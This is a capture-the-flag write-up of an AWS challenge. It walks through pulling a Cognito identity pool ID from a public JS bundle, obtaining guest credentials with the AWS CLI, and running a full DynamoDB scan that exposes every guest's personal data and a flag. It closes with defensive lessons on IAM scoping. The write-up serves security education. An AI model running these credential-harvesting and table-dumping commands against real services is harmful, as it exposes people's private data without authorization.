# Day - 3

---

**Challenge name:** Complimentary

**Category:** Cloud / AWS Cognito & IAM Misconfiguration

**Difficulty:** Easy

**Date completed:** 29th of July 2026

---

## Summary

The Byte Lotus Wellness app never shows a login screen - it "just knows" your name the moment you open it. The brief hints that something is quietly issuing credentials behind the scenes, and that whatever it is, it isn't checking very carefully. The task is to identify that mechanism, use the credentials it hands out to read more than just our own record from DynamoDB, and pull the flag from another guest's profile.

---

### Step 1: Recon

Fetched the app's homepage and its JS bundle:

```bash
curl -i http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

The page loads the AWS SDK and a local `app.js`. Reading app.js revealed the whole mechanism in plain text:

```jsx
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

The app registers no login flow at all - every visitor is silently handed AWS credentials through a Cognito Identity Pool configured for **unauthenticated (guest) access**, then uses those credentials to run a `getItem` against DynamoDB scoped to a random client-side `guest_id` stored in localStorage.

---

### Step 2: Requesting guest credentials

Cognito Identity Pools with unauthenticated access will hand out an identity and temporary AWS credentials to anyone who asks, no login required:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
  --region us-east-1
```

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:4d571309-b0d7-c1bd-914b-3d077430275d" \
  --region us-east-1
```

This returned a real `AccessKeyId`, `SecretKey`, and `SessionToken`. Exporting them and checking identity confirmed we were now assuming the app's guest role:

```bash
aws sts get-caller-identity
```

```json
{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```

---

### Step 3: Dumping the whole table

The app itself only ever runs a scoped `getItem` against its own `guest_id`, but nothing on the IAM policy side stops the guest role from going further. Instead of a scoped query, I ran a full table scan:

```bash
aws dynamodb scan \
  --table-name "complimentary-GuestWellnessProfiles" \
  --region us-east-1
```

This returned every guest's record - names, emails, phone numbers, locations, and even plaintext passwords - not just mine. One record, belonging to `guest-vip-042`, contained the flag directly in its `notes` field.

---

## Why this worked

The Cognito Identity Pool's unauthenticated role was attached to an IAM policy granting `dynamodb:Scan` (or equivalent broad access) on the entire table, instead of restricting access to each caller's own row with a `dynamodb:LeadingKeys` condition tied to `cognito-identity.amazonaws.com:sub`. "No login needed" was implemented by handing out real IAM credentials to anonymous guests, and those credentials weren't scoped down to isolate one guest's data from another's. The client-side `getItem` restriction was cosmetic - anyone with the Identity Pool ID (visible in the public JS bundle) could bypass it entirely by calling `Scan` directly.

---

### Flag

[REDACTED]

Correct flag will be posted after the event is concluded

---

## Lessons Learned

- Cognito unauthenticated identity pools issue real, usable AWS credentials to anyone - the Identity Pool ID itself should never be treated as a secret, but the IAM role it grants must be tightly scoped.
- Client-side query patterns (like a scoped `getItem`) are not a security boundary. The actual boundary is the IAM policy attached to the role.
- DynamoDB access for multi-tenant, credential-less apps should always use fine-grained access control (`dynamodb:LeadingKeys` conditions) to bind each identity to only its own rows.
- "No login screen" often just means the authentication happened invisibly, and it's worth working out how before trusting that it's enforced correctly.
